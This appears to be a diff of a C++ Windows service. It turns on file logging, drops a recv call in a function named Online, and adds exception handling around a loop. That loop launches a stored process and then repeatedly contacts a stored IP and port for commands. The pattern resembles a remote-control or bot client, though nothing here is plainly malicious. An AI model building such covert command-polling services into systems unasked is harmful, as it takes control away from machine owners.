@@ -140,10 +140,10 @@ void StopService()
 
 void writeLog(const char* str)
 {
-	//std::ofstream file;
-	//file.open("C:\\log.txt", std::ios::app);
-	//file << str << '\n';
-	//file.close();
+	std::ofstream file;
+	file.open("C:\\log.txt", std::ios::app);
+	file << str << '\n';
+	file.close();
 }
 
 int InstallService()
@@ -446,8 +446,6 @@ BOOL Online(int port, std::string& ip, const char* command)
 		{
 			if (!strcmp(cstart, b))
 			{
-				recv(s, b, 50, 0);
-				/////////////////////////////////////////////////////////////////////////////////////////
 				char buffer[1024];
 				char start[50];
 				DWORD check = 0;
@@ -664,11 +662,20 @@ void WINAPI ServiceMain(int argc, char* argv[])
 	Sleep(20000);
 	LaunchProcess(adress, &com[0], false, false);
 
-	while (true)
+	try
 	{
-		Sleep(5000);
-		if (!stopped)
-			Online(std::stoi(port), ip, &command[0]);
+		while (true)
+		{
+			Sleep(5000);
+			if (!stopped)
+				Online(std::stoi(port), ip, &command[0]);
+		}
+	}
+	catch (const std::exception& e) 
+	{
+		std::string text = "Main exeption: ";
+		text += e.what();
+		writeLog(text.c_str());
 	}
 
 	return;
